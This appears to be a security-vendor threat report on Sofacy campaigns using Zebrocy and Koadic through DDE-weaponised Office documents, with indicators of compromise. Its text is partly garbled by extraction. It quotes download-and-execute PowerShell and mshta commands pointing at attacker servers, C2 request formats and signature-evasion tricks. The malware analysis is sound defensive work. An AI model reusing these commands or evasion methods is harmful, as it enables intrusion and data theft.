Zebrocy](https://www.paloaltonetworks.com/content/pan/en_US/products/secure-the-endpoint/traps.html)\n[is delivered primarily via phishing attacks that contain malicious Microsoft Office documents with](https://locator.paloaltonetworks.com/)\n[macros as well as simple executable file attachments This third campaign is consistent with two](https://www.paloaltonetworks.com/content/pan/en_US/products/secure-the-cloud/vm-series.html)\n\n\n### Get updates: Unit 42\n\nSign up to receive the latest news, cyber\n\nthreat intelligence and research from\n\nUnit42\n\n\nBusiness Email\n\n\nBy submitting this form, you agree to our\n\n[Terms of Use and acknowledge our](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n[Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/privacy)\n\n\n-----\n\nAn interesting difference we found in this newest campaign was that the attacks using Zebrocy cast a\nfar wider net within the target organization: the attackers sent phishing emails to a an exponentially\n[larger number of individuals. The targeted individuals did not follow any significant pattern, and the](https://www.paloaltonetworks.com/content/pan/en_US/products/secure-the-endpoint/traps.html)\n[email addresses were found easily using web search engines. This is a stark contrast with other attacks](https://www.paloaltonetworks.com/content/pan/en_US/products/globalprotect/subscription.html)\n[commonly associated with the Sofacy group where generally no more than a handful of victims are](https://researchcenter.paloaltonetworks.com/technical-documentation/)\n[targeted within a single organization in a focus-fire style of attack.](https://researchcenter.paloaltonetworks.com/unit42/)\n\n[In addition to the large number of Zebrocy attacks we discovered, we also observed instances of the](https://www.paloaltonetworks.com/content/pan/en_US/solutions/industries/government/government-state-local.html)\n[Sofacy group leveraging the Dynamic Data Exchange (DDE) exploit technique previously documented](https://en.wikipedia.org/wiki/Dynamic_Data_Exchange)\nby McAfee. The instances we observed, however, used the DDE exploit to deliver different payloads\n[than what was observed previously. In one instance the DDE attack was used to deliver and install](https://www.paloaltonetworks.com/content/pan/en_US/solutions/industries/education/education-higher.html)\n[Zebrocy. In another instance, the DDE attack was used to deliver an open-source penetration testing](https://www.paloaltonetworks.com/content/pan/en_US/products/secure-the-network/subscriptions/threat-prevention.html)\n[toolkit called Koadic. The Sofacy group has leveraged open source or freely available tools and](https://www.paloaltonetworks.com/content/pan/en_US/solutions/industries/enterprise/fin-serv.html)\n[exploits in the past but this is the first time that Unit 42 has observed them leveraging the Koadic](https://www.paloaltonetworks.com/content/pan/en_US/solutions/industries/enterprise/retail.html)\ntoolkit.\n\n## Links to previous attacks\n\n[In our February report, we discovered the Sofacy group using Microsoft Office documents with](https://www.paloaltonetworks.com/content/pan/en_US/company/contact-sales.html)\n[malicious macros to deliver the SofacyCarberp payload to multiple government entities. In that report,](https://www.paloaltonetworks.com/content/pan/en_US/products/application-framework.html)\n[we documented our observation that the Sofacy group appeared to use conventional obfuscation](https://www.paloaltonetworks.com/content/pan/en_US/company/contact-sales.html)\ntechniques to mask their infrastructure attribution by using random registrant and service provider\ninformation for each of their attacks. In particular, we noted that the Sofacy group deployed a\n[webpage on each of the domains. This is odd because attackers almost never set up an actual](https://www.paloaltonetworks.com/content/pan/en_US/products/management/logging-service.html)\n[webpage on adversary C2 infrastructure. Even stranger, each webpage contained the same content](https://www.paloaltonetworks.com/content/pan/en_US/products/secure-the-network/subscriptions/autofocus.html)\n[within the body. Since that report, we continued our research into this oddity. Using this artifact, we](https://www.paloaltonetworks.com/content/pan/en_US/products/secure-the-network/subscriptions/minemeld.html)\n[were able to pivot and discover another attack campaign using the DealersChoice exploit kit with](https://researchcenter.paloaltonetworks.com/tag/dealerschoice/)\nsimilar victimology to what we saw in February. Continuing to use this artifact, we discovered another\ndomain with the same content body, supservermgr[.]com. This domain was registered on December\n[20, 2017 and within a few days was resolving to 92.222.136[.]105, which belonged to a well-known](https://www.paloaltonetworks.com/content/pan/en_US/legal-notices/gdpr.html)\n\n\nreCAPTC\n\nPlease upgrade to a supported browser\nto get a reCAPTCHA challenge.\n\nAlternatively if you think you are getting\nthis page in error, please check your\ninternet connection and reload.\n\n\nreCAPTC\n\nPlease upgrade to a supported browser\nto get a reCAPTCHA challenge.\n\nAlternatively if you think you are getting\nthis page in error, please check your\ninternet connection and reload.\n\nWhy is this happening to me?\n\n##### SUBMIT\n\n\n-----\n\nhowever, we were able to determine several unique artifacts which allowed us to expand our dataset\nand discover additional findings. First, we determined the sample we collected, d697160ae… was\nattempting to communicate to its C2 at hxxp://supservermgr[.]com/sys/upd/pageupd.php to retrieve\n[a Zebrocy AutoIT downloader. Because the domain had been sinkholed, this activity could not be](https://en.wikipedia.org/wiki/AutoIt)\ncompleted. However, we were able determine a unique, hard-coded user agent used for the C2\ncommunications:\n\nMozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR\n\n1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR\n\n3.0.04506.648; InfoPath.1)\n\nUsing AutoFocus, we pivoted from the user agent string to expand our data set to three additional\nZebrocy samples using the exact same user agent. This led us to additional infrastructure for Zebrocy\nat 185.25.51[.]198 and 185.25.50[.]93. At this point we had collected nearly thirty samples of Zebrocy\nin relation to the original sample and its associated C2 domain. Additional pivoting based on artifacts\nunique to this malware family expanded our dataset to hundreds of samples used over the last several\n[years. Most of the additional samples were the Delphi and AutoIT variants as reported by ESET.](https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/)\nHowever, several of the collected samples were a C++ variant of the Zobracy downloader tool. In\naddition, we discovered evidence of a completely different payload in Koadic being delivered as well.\nAlso, we found the IP address 185.25.50[.]93 hosting C2 services for a Delphi backdoor that ESET’s\nreport states is the final stage payload for these attacks.\n\nA Maltego chart diagramming the relational analysis we performed is below:\n\n\n-----\n\n_Figure 1 Visualization of relationships_\n\nPlease note this is not a comprehensive chart of all Zebrocy and Koadic samples we were able to\ncollect. Only samples mentioned or relevant to the relational analysis have been included.\n\nFrom the 185.25.50[.]93 C2 IP, we discovered another hard-coded user agent being used by Zebrocy:\n\nMozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.3.8 (WinHTTP/5.1) like\n\nGecko\n\n\n-----\n\nprevious user agent for its C2:\n\nMozilla v5.1 (Windows NT 6.1; rv:6.0.1) Gecko/20100101 Firefox/6.0.1\n\nA malware sample using two separate unique user agent strings is uncommon. A closer examination of\nthe tool revealed the second user agent string was from a secondary payload that was retrieved by the\ncba5ab65a… sample. Pivoting from the Mozilla v5.1 user agent revealed over forty additional Zebrocy\nsamples, with several again targeting the same Central Asian nation. Two samples specifically,\n25f0d1cbc… and 115fd8c61… provided additional artifacts we were able to pivot from to discover\nweaponized documents to deliver Zebrocy as well as a Koadic.\n\nExamining the use of the unique user agents’ strings over time shows that while previously only the\nMozilla/5.0 user agent was in use, since mid 2017 all three user agent strings have been used by the\nZebrocy tool for its C2 communications.\n\n_Figure 2 Timeline of User Agents_\n\n## DDE Documents\n\nThe two weaponized documents we discovered leveraging DDE were of particular interest due to\n\ni i l d h i i\n\n\n-----\n\nto have been targeting a North American government organization dealing with foreign affairs. It\nleveraged DDE to retrieve and install a payload onto the victim host. A decoy document is deployed in\nthis attack, with the contents purporting be a publicly available document from the United Nations\nregarding the Republic of Uzbekistan.\n\n\n-----\n\n-----\n\n_Figure 4 Lure image used_\n\nThe creator of the weaponized document appended their DDE instructions to the end of the\ndocument after all of the decoy contents. When the document is opened in Word, the instructions are\nnot immediately visible, as Word does not display these fields contents by default. As you can see in\nthe following screenshot, simply attempting to highlight the lines in which the DDE instructions reside\ndoes not display them.\n\n_Figure 5 Hidden DDE commands_\n\nEnabling the “Toggle Field Codes” feature reveals the DDE instructions to us and shows that the\nauthor had set instructions to size 1 font and with a white coloring. The use of a white font coloring\nto hide contents within a weaponized document is a technique we had [previously reported being used](https://researchcenter.paloaltonetworks.com/2018/02/unit42-sofacy-attacks-multiple-government-entities/)\nby the Sofacy group in a malicious macro attack.\n\nThe DDE instructions attempt to run the following the following command on the victim host, which\nattempts to download and execute a payload from a remote server:\n\n\n1\n2\n3\n\n\nC:\\\\Programs\\\\Microsoft\\\\MSOffice\\\\Word.exe\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\\nSystem32\\\\rundll32.exe\nC \\\\Wi d \\\\S t 32\\\\ h ll32 dll Sh llE R DLL\n\n\n-----\n\nDDE instructions also included another command that it did not run, which suggests it is an artifact of\na prior version of this delivery document. The following shows this unused command, which exposed\nan additional server within Sofacy’s infrastructure would download and execute an encoded\nPowerShell script from 92.114.92[.]102:\n\n\n1\n2\n3\n4\n5\n\n\nC:\\\\Programs\\\\Microsoft\\\\MSOffice\\\\Word.exe\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\\nSystem32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -NoP -sta -NonI -W\nhidden $e=(New-Object\nSystem.Net.webClient).downloadString('hxxp://92.114.92[.]102:80/d');po\nwershell -enc $e #\n\n\nThe unused command above appears to be related to previous attacks, specifically attacks that\noccurred in November 2017 as discussed by [McAfee and](https://securingtomorrow.mcafee.com/mcafee-labs/apt28-threat-group-adopts-dde-technique-nyc-attack-theme-in-latest-campaign/) [ESET. The payload delivered in these](https://www.welivesecurity.com/2017/12/21/sednit-update-fancy-bear-spent-year/)\nNovember 2017 attacks using DDE enabled documents was SofacyCarberp, which differs from the\nZebrocy downloader delivered in the February 2018 attacks.\n\n115fd8c61… was another Zebrocy sample we were able to pivot from by gathering additional samples\nconnecting to its C2 86.106.131[.]177. The additional samples targeted the same large Central Asian\nnation state as previously mentioned but more interestingly, one of the samples was a weaponized\ndocument also leveraging DDE and containing a non-Zebrocy payload. The payload turned out to be\nan open source penetration test toolkit called Koadic. It is a toolkit similar to Metasploit or PowerShell\nEmpire and is freely available to anyone on Github.\n\n\n-----\n\n_Figure 6 Example of delivery document_\n\nThe RTF document (8cf3bc2bf…) was very small in size at 264 bytes, which can be seen in its entirety\n\n\n-----\n\n4\n5\n6\n\n\n'hxxp://86.106.131[.]177/link/GRAPH.EXE'\n,    '%apPDAtA%\\graph.exe'  )  ;    saps\n'%Appdata%\\graph.exe'\"}}}\n\n\nThe contents above use the DDE functionality in Microsoft Word to run a PowerShell script to\ndownload the Koadic payload from a remote server, save it as an executable file on the system and\nthen execute the payload.\n\n## Conclusion\n\nThe Sofacy group continues their targeted attack campaigns in 2018. As mentioned in this blog,\nSofacy is carrying out parallel campaigns to attack similar targets around the world but with different\ntoolsets. The Zebrocy tool associated with this current strain of attacks is constructed in several\ndifferent forms based on the programming language the developer chose to create the tool. We have\nobserved Delphi, AutoIt, and C++ variants of Zebrocy, all of which are related not only in their\nfunctionality, but also at times by chaining the variants together in a single attack. These attacks are\nstill largely perpetrated via spear phishing campaigns, whether via simple executable attachments in\nhopes that a victim will launch the file to using a previously observed DDE exploitation technique.\n\nPalo Alto Networks customers are protected from Zebrocy and Koadic attacks by:\n\nAll known Zebrocy samples have a malicious verdict in WildFire\nAutoFocus customers can track this campaign with the following Tags:\n\n[Zebrocy](https://autofocus.paloaltonetworks.com/#/tag/Unit42.ZebrocyDownloader)\n[Koadic](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Koadic)\n\n## Appendix\n\n**Zebrocy C++ Variant**\n\nOn February 19 2018 we saw a spear phishing email sent to a foreign affairs organization within a\n\n\n-----\n\nThis variation of the Zebrocy downloader begins by gathering the serial number for the storage\nvolume with the label “C:\\” and the computer name. It then creates an invisible window (0x0 pixel) in\nthe bottom right corner of the screen, which will call the main function of the Trojan.\n\nThe main function of the Trojan interacts with its configured C2 server to obtain additional code to\nexecute. The main function gets pertinent strings to communicate with its C2 by calling a subfunction with a specific number that the sub-function uses as a case within a switch statement to\ndecrypt the desired string. For instance, here are the resulting decrypted strings from each of the case\nstatements (dd7e69e1…):\n\nCase – String decrypted\n\n1 – 85.25.50[.]93\n\n2 – POST http://185.25.50[.]93/syshelp/kd8812u/protocol.php\nHTTP/1.1\\r\\nHost: 185.25.50[.]93\\r\\nContent-Type: application/x-www\nform-urlencoded\\r\\nContent-Length:\n\n3 – porg=\n\n4 – Content-Length:\n\nThe Trojan uses raw sockets to communicate with its C2 server and uses the decrypted string above\nto create HTTP requests. It starts by calling this specific sub-function with an argument of 1 to get the\nIP address for the C2 to connect. It then calls the subfunction with the argument of 2 to get the string\nthat it will use as the HTTP POST request. The main function then calls the subfunction with the\nargument 3 to get the POST data parameter (“porg”) along with the volume serial number and\ncomputer name and will send this data to the C2 via the HTTP POST request. The resulting HTTP\nPOST request looks like the following:\n\nPOST http://185.25.50[.]93/syshelp/kd8812u/protocol.php HTTP/1.1\n\nHost: 185.25.50[.]93\n\n\n-----\n\nporg=44908AE0524f422d\n\nWe have not seen a C2 server respond to our requests during our analysis, however, we do know how\nthe Trojan will parse the C2’s response for specific data.\n\n-1 – Deletes the buffer and exits the Trojan.\n\n009 – Deletes the buffers and exits the Trojan.\n\nIf neither of the above values are found at the beginning of the HTTP response, the Trojan checks the\nC2 response for the ASCII representation of hexadecimal bytes. The Trojan will convert these\nhexadecimal bytes to their binary values and write them to a file and will run the file using the “open”\nfunction using the ShellExecuteW API function.\n\nWe have seen the following HTTP POST parameters within the Zebrocy C++ samples:\n\nporg\n\nstructOne\n\noq\n\nvolume\n\n**DDE Details**\n\nThe author of the DDE document used in the February 2018 attacks used some obfuscation\ntechniques in an attempt to evade detection. First, the DDE instructions heavily rely on the QUOTE\nfield, which converts decimal values to their ASCII equivalent character. Also, the author capitalized\nthe “E” in the “dde” command to evade case sensitive signatures. Lastly, the author bolded the “dd”\ncharacters within the “dde” command, which breaks the string up within the XML of the DOCX file\n(word/document.xml) to make signature development difficult, as seen here:\n\n\n-----\n\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n<w:noProof/>\n<w:color w:themeColor=\"background1\" w:val=\"FFFFFF\"/>\n<w:sz w:val=\"2\"/>\n<w:szCs w:val=\"2\"/>\n</w:rPr>\n<w:instrText>dd</w:instrText>\n</w:r>\n<w:r w:rsidRPr=\"00E84CED\">\n<w:rPr>\n<w:color w:themeColor=\"background1\" w:val=\"FFFFFF\"/>\n<w:sz w:val=\"2\"/>\n<w:szCs w:val=\"2\"/>\n</w:rPr>\n<w:instrText xml:space=\"preserve\">E </w:instrText>\n</w:r>\n\n\nIn addition to the aforementioned DOCX file, we found another related DDE enabled document\nbased on an infrastructure overlap with a Zebrocy C2 IP address. This related delivery document was\nan RTF file that downloaded and installed a payload used to load the open-source Koadic tool. We do\nnot have telemetry on the target or attack vector, but we know the RTF file used DDE to download\nand execute an executable that loaded Koadic.\n\nThe payload (abbad7acd…) is an executable that appears to have been created by a VBScript to\nExecutable tool and further obfuscated with a cryptor. Our analysis shows some possible ties to the\n[Vbs to Exe tool by F2KO Software but we have yet to confirm a direct overlap. We believe the actor](http://www.f2ko.de/en/index.php)\nused a cryptor on the payload, as it obtains a filename and script from within its resources and\ndecodes these resources by multiplying each byte by negative one. The payload then uses the MD5\nhash (14331d289e737093994395d3fc412afc) of what appears to be a hardcoded SHA1 hash\n(B6A75B1EF701710D7AEADE0FE93DE8477F3BD506) as an RC4 key to decrypts the resulting\ndecoded data. For instance, the following data exists within a resource:\n\nfb 70 b0 c9 bd c5 8a d4 0c 54 fd 4c 6d bb f0 0f\n\nBy multiplying each byte with -1, we obtain the following data:\n\n05 90 50 37 43 3b 76 2c f4 ac 03 b4 93 45 10 f1\n\n\n-----\n\n\\x00\\x00\\x00\\x00FlashRun.vbs\n\nWe do not see the payload using this FlashRun.vbs filename, instead it uses a temporary file name to\nstore an embedded VBScript file, such as %Temp%\\4.tmp\\5.vbs. The embedded VBScript is retrieved\nfrom a resource and decrypted using the same algorithm as discussed above, which results in the\nfollowing cleartext:\n\n\n1\n2\n\n\nset objshell = createobject(\\\"wscript.shell\\\")\nobjshell.run \\\"mshta hxxp://86.106.131.177:6500/zIZFh\\\",vbhide\n\n\nThe Koadic C2 server will respond to this request with Javascript code that acts as the Koadic staging\npayload, which allows the actor to run additional Koadic modules on the end system to carry out their\npost-exploitation activities. Unfortunately, we did not observe the Koadic modules used by Sofacy\nduring out analysis.\n\n## IOCs\n\n\n**Domain**\n\n\nsupservermgr[.]com\n\n\n**URL**\n\n\nhxxp://supservermgr[.]com/sys/upd/pageupd.php\n\n\n**Zebrocy**\n\n\nd697160aecf152a81a89a6b5a7d9e1b8b5e121724038c676157ac72f20364edc\n\ncba5ab65a24be52214736bc1a5bc984953a9c15d0a3826d5b15e94036e5497df\n\n25f0d1cbcc53d8cfd6d848e12895ce376fbbfaf279be591774b28f70852a4fd8\n\n115fd8c619fa173622c7a1e84efdf6fed08a25d3ca3095404dcbd5ac3deb1f03\n\nf27836430742c9e014e1b080d89c47e43db299c2e00d0c0801a2830b41b57bc1\n\n5b5e80f63c04402d0b282e95e32155b2f86cf604a6837853ab467111d4ac15e2\n\n\n-----\n\nabbad7acd50754f096fdc6551e728aa6054dcf8e55946f90a02b17db552471ca\n\n\n**User Agents**\n\n\nMozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR\n\n2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; InfoPath.1)\n\n\nMozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.3.8 (WinHTTP/5.1) like Gecko\n\n\nMozilla v5.1 (Windows NT 6.1; rv:6.0.1) Gecko/20100101 Firefox/6.0.1\n\n\n**IPs**\n\n\n185.25.51[.]198\n\n185.25.50[.]93\n\n220.158.216[.]127\n\n92.114.92[.]102\n\n86.106.131[.]177\n\n\n**DDE Docs**\n\n\n85da72c7dbf5da543e10f3f806afd4ebf133f27b6af7859aded2c3a6eced2fd5\n\n8cf3bc2bf36342e844e9c8108393562538a9af2a1011c80bb46416c0572c86ff\n\n\n##### Got something to say?\n\n\n-----\n\n**Notify me of followup comments via e-mail**\n\n\nName (required)\n\n\nEmail (required)\n\n\nWebsite\n\n\nSUBMIT\n\n\nCOMPANY\n\n[Company](https://www.paloaltonetworks.com/company)\n\n[Careers](http://jobs.jobvite.com/paloaltonetworks/)\n\n\nLEGAL NOTICES\n\n[Privacy](https://www.paloaltonetworks.com/legal-notices/privacy)\n\n[Terms of Use](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\nACCOUNT\n\n[Manage a Subscription](https://www.paloaltonetworks.com/company/subscriptions)\n\n\n-----\n\n© 2018 Palo Alto Networks, Inc.
